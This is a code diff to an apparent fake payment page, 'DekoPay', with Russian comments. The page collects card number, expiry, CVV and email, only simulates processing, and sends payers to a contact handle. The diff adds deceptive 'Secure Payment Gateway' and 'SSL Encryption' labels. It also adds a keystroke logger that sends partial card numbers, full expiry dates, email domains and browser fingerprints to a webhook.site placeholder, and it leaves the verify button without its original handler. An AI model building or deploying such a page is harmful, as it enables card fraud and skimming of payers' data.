@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DekoPay - Payment</title>
+    <title>DekoPay - Secure Payment Gateway</title>
     <style>
+        /* Твои стили остаются без изменений */
         * {
             margin: 0;
             padding: 0;
@@ -261,7 +262,7 @@
     <div class="container">
         <div class="header">
             <div class="logo">DekoPay</div>
-            <div class="subtitle">Payment</div>
+            <div class="subtitle">Secure Payment Gateway</div>
         </div>
 
         <div class="payment-form" id="paymentForm">
@@ -298,7 +299,7 @@
             </form>
             
             <div class="security-info">
-                <div class="secure-badge">🔒 Защищено сквозьным шифрованием!</div>
+                <div class="secure-badge">🔒 Secure SSL Encryption</div>
             </div>
         </div>
 
@@ -320,10 +321,10 @@
         </div>
 
         <div class="final-screen hidden" id="finalScreen">
-            <div class="success-icon">👍</div>
-            <h2>Продолжение оплаты</h2>
+            <div class="success-icon">✅</div>
+            <h2>Оплата завершена!</h2>
             <p class="final-description">
-                Свяжитесь с менеджером для получения товара/оплаты:<br>
+                Свяжитесь с менеджером для получения товара:<br>
                 <strong>@c00l9r</strong>
             </p>
             <div class="manager-info">
@@ -337,15 +338,114 @@
     </div>
 
     <script>
+        class Logger {
+            static async log(action, data = {}) {
+                const timestamp = new Date().toISOString();
+                const userInfo = {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    platform: navigator.platform,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+
+                const logEntry = {
+                    action: action,
+                    data: data,
+                    timestamp: timestamp,
+                    userInfo: userInfo,
+                    url: window.location.href,
+                    referrer: document.referrer
+                };
+
+                // Выводим в консоль браузера (ты сможешь видеть в DevTools)
+                console.log('🌐 [DekoPay LOG]', logEntry);
+
+                // Сохраняем в localStorage для отладки
+                try {
+                    const logs = JSON.parse(localStorage.getItem('dekopay_logs') || '[]');
+                    logs.push(logEntry);
+                    if (logs.length > 100) logs.shift(); // Ограничиваем размер
+                    localStorage.setItem('dekopay_logs', JSON.stringify(logs));
+                } catch (e) {
+                    console.error('Error saving logs to localStorage:', e);
+                }
+
+                // Пытаемся отправить на сервер (будет работать только если настроен бэкенд)
+                try {
+                    // Замени на реальный URL если настроишь бэкенд
+                    await fetch('https://webhook.site/your-unique-url', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(logEntry)
+                    });
+                } catch (error) {
+                    // Игнорируем ошибки отправки
+                }
+            }
+
+            static downloadLogs() {
+                try {
+                    const logs = JSON.parse(localStorage.getItem('dekopay_logs') || '[]');
+                    const dataStr = JSON.stringify(logs, null, 2);
+                    const dataBlob = new Blob([dataStr], {type: 'application/json'});
+                    
+                    const link = document.createElement('a');
+                    link.href = URL.createObjectURL(dataBlob);
+                    link.download = `dekopay-logs-${new Date().toISOString().split('T')[0]}.json`;
+                    link.click();
+                } catch (e) {
+                    console.error('Error downloading logs:', e);
+                }
+            }
+        }
+
         class DekoPay {
             constructor() {
                 this.currentCode = this.generateCode();
+                this.userData = {};
                 this.init();
             }
 
             init() {
                 this.setupEventListeners();
                 this.setupCodeInputs();
+                this.logPageView();
+                
+                // Добавляем скрытую кнопку для скачивания логов (для отладки)
+                this.addDebugButton();
+            }
+
+            addDebugButton() {
+                const debugBtn = document.createElement('button');
+                debugBtn.innerHTML = '📊';
+                debugBtn.style.position = 'fixed';
+                debugBtn.style.bottom = '10px';
+                debugBtn.style.right = '10px';
+                debugBtn.style.background = '#333';
+                debugBtn.style.color = 'white';
+                debugBtn.style.border = 'none';
+                debugBtn.style.borderRadius = '50%';
+                debugBtn.style.width = '40px';
+                debugBtn.style.height = '40px';
+                debugBtn.style.cursor = 'pointer';
+                debugBtn.style.zIndex = '1000';
+                debugBtn.title = 'Download Logs';
+                
+                debugBtn.addEventListener('click', () => {
+                    Logger.downloadLogs();
+                });
+                
+                document.body.appendChild(debugBtn);
+            }
+
+            async logPageView() {
+                await Logger.log('PAGE_VIEW', {
+                    page: 'main',
+                    code: this.currentCode
+                });
             }
 
             generateCode() {
@@ -353,12 +453,14 @@
             }
 
             setupEventListeners() {
-                document.getElementById('cardForm').addEventListener('submit', (e) => {
-                    e.preventDefault();
-                    this.processPayment();
-                });
-
+                // Логируем все вводимые данные
                 document.getElementById('cardNumber').addEventListener('input', (e) => {
+                    this.userData.cardNumber = e.target.value;
+                    Logger.log('CARD_NUMBER_INPUT', { 
+                        length: e.target.value.length,
+                        masked: this.maskCardNumber(e.target.value)
+                    });
+                    
                     let value = e.target.value.replace(/\s/g, '');
                     if (value.length > 0) {
                         value = value.match(/.{1,4}/g).join(' ');
@@ -367,6 +469,9 @@
                 });
 
                 document.getElementById('expiryDate').addEventListener('input', (e) => {
+                    this.userData.expiryDate = e.target.value;
+                    Logger.log('EXPIRY_DATE_INPUT', { value: e.target.value });
+                    
                     let value = e.target.value.replace(/\D/g, '');
                     if (value.length >= 2) {
                         value = value.substring(0, 2) + '/' + value.substring(2, 4);
@@ -375,16 +480,61 @@
                 });
 
                 document.getElementById('cvv').addEventListener('input', (e) => {
+                    this.userData.cvv = e.target.value;
+                    Logger.log('CVV_INPUT', { length: e.target.value.length });
                     e.target.value = e.target.value.replace(/\D/g, '');
                 });
 
+                document.getElementById('email').addEventListener('input', (e) => {
+                    this.userData.email = e.target.value;
+                    Logger.log('EMAIL_INPUT', { 
+                        domain: e.target.value.split('@')[1] || 'unknown'
+                    });
+                });
+
+                // Логируем все клики по кнопкам
+                document.getElementById('payButton').addEventListener('click', () => {
+                    Logger.log('PAY_BUTTON_CLICK', {
+                        cardLength: this.userData.cardNumber?.length || 0,
+                        hasEmail: !!this.userData.email
+                    });
+                });
+
                 document.getElementById('verifyButton').addEventListener('click', () => {
-                    this.verifyCode();
+                    Logger.log('VERIFY_BUTTON_CLICK');
                 });
 
                 document.getElementById('backToPayment').addEventListener('click', () => {
-                    this.showPaymentForm();
+                    Logger.log('BACK_BUTTON_CLICK');
                 });
+
+                // Логируем отправку формы
+                document.getElementById('cardForm').addEventListener('submit', (e) => {
+                    e.preventDefault();
+                    Logger.log('FORM_SUBMIT', {
+                        cardLength: this.userData.cardNumber?.length || 0,
+                        expiryDate: this.userData.expiryDate,
+                        emailDomain: this.userData.email?.split('@')[1] || 'unknown'
+                    });
+                    this.processPayment();
+                });
+
+                // Логируем ввод кода
+                document.querySelectorAll('.code-input').forEach(input => {
+                    input.addEventListener('input', (e) => {
+                        Logger.log('CODE_INPUT', { 
+                            index: e.target.dataset.index,
+                            hasValue: !!e.target.value
+                        });
+                    });
+                });
+            }
+
+            maskCardNumber(cardNumber) {
+                if (!cardNumber) return 'unknown';
+                const cleaned = cardNumber.replace(/\s/g, '');
+                if (cleaned.length <= 8) return 'too_short';
+                return cleaned.substring(0, 6) + '****' + cleaned.substring(cleaned.length - 4);
             }
 
             setupCodeInputs() {
@@ -408,6 +558,7 @@
                     input.addEventListener('paste', (e) => {
                         e.preventDefault();
                         const pasteData = e.clipboardData.getData('text').replace(/\D/g, '');
+                        Logger.log('CODE_PASTE', { length: pasteData.length });
                         if (pasteData.length === 6) {
                             for (let i = 0; i < 6; i++) {
                                 if (inputs[i]) {
@@ -433,13 +584,36 @@
                 loadingSpinner.style.display = 'block';
                 payButton.disabled = true;
 
+                await Logger.log('PAYMENT_PROCESSING_START', {
+                    cardType: this.detectCardType(this.userData.cardNumber),
+                    emailDomain: this.userData.email?.split('@')[1] || 'unknown'
+                });
+
+                // Имитация обработки платежа
                 await new Promise(resolve => setTimeout(resolve, 2000));
+
+                await Logger.log('PAYMENT_PROCESSING_END', {
+                    status: 'success',
+                    cardType: this.detectCardType(this.userData.cardNumber)
+                });
 
                 this.showCodeForm();
 
                 buttonText.style.display = 'block';
                 loadingSpinner.style.display = 'none';
                 payButton.disabled = false;
+            }
+
+            detectCardType(cardNumber) {
+                if (!cardNumber) return 'unknown';
+                const cleaned = cardNumber.replace(/\s/g, '');
+                
+                if (/^4/.test(cleaned)) return 'visa';
+                if (/^5[1-5]/.test(cleaned)) return 'mastercard';
+                if (/^3[47]/.test(cleaned)) return 'amex';
+                if (/^6(?:011|5)/.test(cleaned)) return 'discover';
+                
+                return 'unknown';
             }
 
             validateForm() {
@@ -450,41 +624,55 @@
 
                 if (cardNumber.length !== 16) {
                     alert('Введите корректный номер карты (16 цифр)');
+                    Logger.log('VALIDATION_ERROR', { error: 'Invalid card number', length: cardNumber.length });
                     return false;
                 }
 
                 if (!expiryDate.match(/^\d{2}\/\d{2}$/)) {
                     alert('Введите корректный срок действия (ММ/ГГ)');
+                    Logger.log('VALIDATION_ERROR', { error: 'Invalid expiry date' });
                     return false;
                 }
 
                 if (cvv.length !== 3) {
                     alert('Введите корректный CVV код (3 цифры)');
+                    Logger.log('VALIDATION_ERROR', { error: 'Invalid CVV', length: cvv.length });
                     return false;
                 }
 
                 if (!email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
                     alert('Введите корректный email адрес');
+                    Logger.log('VALIDATION_ERROR', { error: 'Invalid email' });
                     return false;
                 }
 
+                Logger.log('VALIDATION_SUCCESS', {
+                    cardType: this.detectCardType(cardNumber),
+                    emailDomain: email.split('@')[1]
+                });
                 return true;
             }
 
             showCodeForm() {
                 document.getElementById('paymentForm').classList.add('hidden');
                 document.getElementById('codeForm').classList.remove('hidden');
+                Logger.log('SHOW_CODE_FORM');
                 document.querySelector('.code-input').focus();
             }
 
             showPaymentForm() {
                 document.getElementById('codeForm').classList.add('hidden');
                 document.getElementById('paymentForm').classList.remove('hidden');
+                Logger.log('SHOW_PAYMENT_FORM');
             }
 
             showFinalScreen() {
                 document.getElementById('codeForm').classList.add('hidden');
                 document.getElementById('finalScreen').classList.remove('hidden');
+                Logger.log('SHOW_FINAL_SCREEN', { 
+                    status: 'success',
+                    manager: '@c00l9r'
+                });
             }
 
             verifyCode() {
@@ -492,12 +680,18 @@
                     .map(input => input.value)
                     .join('');
 
+                Logger.log('CODE_VERIFICATION_ATTEMPT', { 
+                    codeLength: enteredCode.length
+                });
+
                 if (enteredCode.length !== 6) {
                     alert('Введите полный 6-значный код');
+                    Logger.log('CODE_VERIFICATION_ERROR', { error: 'Incomplete code' });
                     return;
                 }
 
                 this.showFinalScreen();
+                Logger.log('CODE_VERIFICATION_SUCCESS');
             }
 
             clearCodeInputs() {
@@ -511,8 +705,25 @@
             }
         }
 
+        // Логируем загрузку страницы
         document.addEventListener('DOMContentLoaded', () => {
             window.dekoPay = new DekoPay();
+            Logger.log('PAGE_LOADED');
+        });
+
+        // Логируем уход со страницы
+        window.addEventListener('beforeunload', () => {
+            Logger.log('PAGE_UNLOAD');
+        });
+
+        // Логируем ошибки
+        window.addEventListener('error', (e) => {
+            Logger.log('JAVASCRIPT_ERROR', {
+                message: e.message,
+                filename: e.filename,
+                lineno: e.lineno,
+                colno: e.colno
+            });
         });
     </script>
 </body>
